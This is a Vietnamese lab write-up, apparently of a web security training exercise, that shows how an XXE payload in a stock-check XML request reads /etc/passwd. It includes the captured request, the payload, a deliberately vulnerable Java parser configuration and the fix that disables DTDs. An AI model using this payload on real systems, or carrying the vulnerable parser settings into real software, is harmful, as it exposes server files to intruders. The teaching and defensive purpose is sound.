
![](../assets/Pasted%20image%2020261116221148.png)

# 1. Mục tiêu

Sử dụng "Check stock" để thực thi lỗ hổng XXE để đọc được file /etc/passwd

### Nền tảng cần nắm trước (XML, entity, DTD)
- **Entity** là cách đại diện một giá trị bằng một cái tên. Parser gặp `&tên;` thì thay bằng giá trị — y hệt `#define` trong C.
- **DTD (Document Type Definition)** là nơi khai báo luật và entity, nằm trong `DOCTYPE`. Có ba dạng: internal (nhúng thẳng trong tài liệu), external (trỏ ra file ngoài), và hybrid (lai cả hai).
- **External entity** dùng từ khóa `SYSTEM` kèm một URL: `file://` để đọc file trên server, `http://` để bắt server gửi request đi. Điểm cốt lõi khiến tất cả đòn XXE thành hình: **parser chạy trên server**, nên hai thứ này đọc file / gọi URL bằng chính quyền của server.

Vậy external entity vốn sinh ra để làm gì mà giờ phải tắt? XML thừa kế từ SGML — ngôn ngữ soạn **tài liệu lớn**, nơi tác giả kiểm soát cả file (đáng tin), external entity là để ghép tài liệu từ nhiều mảnh (giống `#include`). Vấn đề là XML sau này bị đem đi **trao đổi dữ liệu** (API/SOAP), nhận input từ người lạ → **attacker trở thành người viết DTD**. Tính năng vẫn chạy đúng thiết kế, cái đổi là **người điều khiển nó** — ranh giới tin cậy (trust boundary) đã dịch. API hiện đại không cần tính năng này nên tắt đi mà chẳng mất gì.

# 2. Recon
![](../assets/Pasted%20image%2020261116222603.png)
Đây là một trang web bán các sản phẩm

![](../assets/Pasted%20image%2020261116222738.png)

Phát hiện tính năng check số lượng hàng còn lại

```http
POST /product/stock HTTP/2
Host: 0a8a00fd04b3681180839adf00720062.web-security-academy.net
Cookie: session=BWFXlZ7dTjilaLUHuHAQmNVHwa7xg9Gq
Content-Length: 107
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: application/xml
Accept: */*
Origin: https://0a8a00fd04b3681180839adf00720062.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a8a00fd04b3681180839adf00720062.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?><stockCheck>
<productId>2</productId>
<storeId>1</storeId>
</stockCheck>
```

HTTP POST gửi payload định dạng XML với nội dung truy vấn check stock của sản phẩm có ID là 2, cơ sở có ID là 1.

# 3. Exploit

Sử dụng DTD (Document Type Definition) với custom entity 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xml_injection [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<stockCheck>
<productId>
&xxe;</productId>
<storeId>1</storeId>
</stockCheck>
```


![](../assets/Pasted%20image%2020261116223912.png)

Kỹ thuật: Khai báo entity có tên xxe với nội dung là dữ liệu của /etc/passwd ở server, đặt trong tag productID. Response trả về `400 Bad Request` với `"Invalid product ID:"` kèm **nguyên nội dung /etc/passwd** (`root:x:0:0:...`) được phản chiếu ra ngay sau đó.

Đúc kết: XXE kinh điển kiểu đọc file này cần **đủ hai điều kiện**:
1. Parser **resolve external entity** (cấu hình bật) — để `&xxe;` biến thành nội dung file.
2. Giá trị đó bị **phản chiếu ra response** — ở đây là qua thông báo "Invalid product ID".

Thiếu điều kiện (2) thì mình vẫn đọc được file, nhưng không nhìn thấy — đó chính là **Blind XXE** sẽ gặp ở LAB03 trở đi.

# 4. Mô phỏng backend xử lý
![](../assets/Pasted%20image%2020261116225225.png)

Thử một payload khác cho productId thấy response phản chiếu lại giá trị đó, suy ra backend có một nhánh `else` kiểu "Invalid product ID: " + productId. Dấu vết lỗi ở các lab sau (`java.net.*`, `java.io.*`) cho thấy backend là **Java** dùng `DocumentBuilderFactory`, nên mô phỏng lại bằng Java cho sát:

```java
// Parser bật DTD + external entity -> cấu hình nguy hiểm
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", true);

Document doc = dbf.newDocumentBuilder().parse(input);   // &xxe; được resolve ở bước parse này
String productId = doc.getElementsByTagName("productId").item(0).getTextContent();
return "\"Invalid product ID: " + productId + "\"";     // productId giờ chứa nội dung file -> phản chiếu ra response
```

Lỗi gốc nằm ở chỗ parser được bật resolve external entity (`load-external-dtd` + `external-general-entities`). Code lấy `productId` — giờ đã chứa nội dung file — rồi ghép thẳng vào thông báo lỗi → lộ dữ liệu. (Cấu hình bật này tùy ngôn ngữ có tên khác nhau: Java là các `setFeature(...)` ở trên, Python lxml là `resolve_entities=True`, PHP là cờ `LIBXML_NOENT`.)

# 5. Cách vá
```java
// Tắt DTD -> dập mọi biến thể XXE tận gốc
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

Hạn chế tối đa quyền, loại bỏ tính năng resolve entities và load DTD nếu ứng dụng không dùng tới chức năng đó. Loại bỏ cả việc phản chiếu lại response ra ngoài nếu không cần thiết. Chỉ cần báo lỗi chung chung như "Invalid product ID or storeID".

> **Bên lề — chặn mạng thôi có đủ không?** Không. Chặn truy cập mạng (http, ftp) chỉ cản được nhánh SSRF, **không chặn `file://`** nên vẫn đọc được file. Bản vá gốc rễ là **tắt hẳn DTD** (`disallow-doctype-decl`) — một dòng này dập được cả đọc file lẫn SSRF lẫn các biến thể blind. Chặn mạng chỉ nên coi là defense-in-depth phủ thêm, không phải bản vá chính.
